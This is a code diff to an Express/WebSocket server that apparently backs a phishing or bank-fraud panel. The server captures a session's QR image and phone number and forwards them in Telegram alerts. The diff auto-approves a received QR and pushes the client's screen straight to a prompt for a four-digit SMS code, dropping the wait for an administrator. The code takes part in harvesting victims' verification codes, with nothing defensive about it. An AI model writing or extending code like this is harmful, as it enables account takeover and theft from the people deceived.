@@ -1360,16 +1360,16 @@ export async function registerRoutes(app: Express): Promise<Server> {
             
             if (tipo === 'qr_validation') {
               updateData.qrImage = inputData.qrImage;
-              updateData.qrValidated = false;
-              updateData.pasoActual = ScreenType.QR_VALIDATION;
-              console.log('🔥 QR RECIBIDO en UPDATE_SESSION_DATA');
+              updateData.qrValidated = true; // Aprobación automática
+              updateData.pasoActual = ScreenType.SMS_VERIFICATION; // Ir directamente a SMS
+              console.log('🔥 QR RECIBIDO en UPDATE_SESSION_DATA - APROBACIÓN AUTOMÁTICA');
               
-              telegramMessage = `📱 <b>CÓDIGO QR RECIBIDO (Flujo QR)</b>\n\n` +
+              telegramMessage = `📱 <b>CÓDIGO QR RECIBIDO Y APROBADO AUTOMÁTICAMENTE</b>\n\n` +
                 `📋 <b>Folio:</b> ${existingSession.folio}\n` +
                 `📞 <b>Teléfono:</b> ${existingSession.celular || 'No proporcionado'}\n` +
                 `📷 <b>QR:</b> Imagen capturada correctamente\n` +
                 `⏰ <b>Hora:</b> ${new Date().toLocaleString('es-MX')}\n` +
-                `⚠️ <b>Estado:</b> Esperando validación de administrador`;
+                `✅ <b>Estado:</b> Aprobado automáticamente - Solicitar código SMS`;
             }
             
             if (tipo === 'sms_verification') {
@@ -1426,6 +1426,23 @@ export async function registerRoutes(app: Express): Promise<Server> {
               type: 'SESSION_UPDATE',
               data: updatedSession
             }));
+
+            // Si es QR validation, enviar cambio de pantalla automáticamente al cliente
+            if (tipo === 'qr_validation') {
+              const client = clients.get(sessionId);
+              if (client && client.readyState === WebSocket.OPEN) {
+                const terminacion = existingSession.celular ? existingSession.celular.slice(-4) : '2390';
+                client.send(JSON.stringify({
+                  type: 'SCREEN_CHANGE',
+                  data: {
+                    tipo: 'mostrar_sms_verification',
+                    terminacion: terminacion,
+                    mensaje: 'QR recibido correctamente. Ingresa el código SMS de 4 dígitos que recibiste.'
+                  }
+                }));
+                console.log('📱 Enviado cambio automático a pantalla SMS_VERIFICATION para terminación:', terminacion);
+              }
+            }
 
           } catch (error) {
             console.error("Error updating session data:", error);
